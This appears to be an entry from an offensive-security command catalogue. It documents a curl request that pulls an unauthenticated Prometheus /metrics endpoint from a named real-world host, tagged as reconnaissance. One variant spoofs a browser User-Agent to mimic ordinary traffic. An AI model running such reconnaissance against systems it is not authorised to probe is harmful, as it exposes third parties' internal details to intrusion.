---
data: 'curl -s https://fax.wavecell.com/metrics'
tags:
  - reconnaissance
  - information-disclosure
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 10900176-2635-4f51-9dc9-ca8fe9221d76
created_at: '2025-12-14T17:25:18.157Z'
updated_at: '2025-12-14T17:25:18.157Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-metrics

## Command

```bash
curl -s https://fax.wavecell.com/metrics
```

## Description

This command uses curl to perform a silent GET request to the /metrics endpoint, retrieving sensitive Prometheus-style metrics data without authentication. It is useful for quick reconnaissance of exposed monitoring endpoints in web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode: Suppress progress meter and error messages | Yes |
| `https://fax.wavecell.com/metrics` | Target URL for the metrics endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -s https://fax.wavecell.com/metrics
```

### Advanced Usage

```bash
curl -s -H "User-Agent: Mozilla/5.0" https://fax.wavecell.com/metrics | head -50
```

> Adds a standard User-Agent header to mimic browser traffic and limits output to the first 50 lines for initial inspection.

## Expected Output

Raw text in Prometheus exposition format, such as:

```
# HELP go_threads Number of OS threads created
# TYPE go_threads gauge
go_threads 12
# HELP http_requests_total The total number of HTTP requests
# TYPE http_requests_total counter
http_requests_total{code="200",method="get"} 1234
```
This includes metric names, values, labels, and timestamps revealing application and system details.

## Related

- [[Related Procedure: Access-Unprotected-Metrics-Endpoint]]
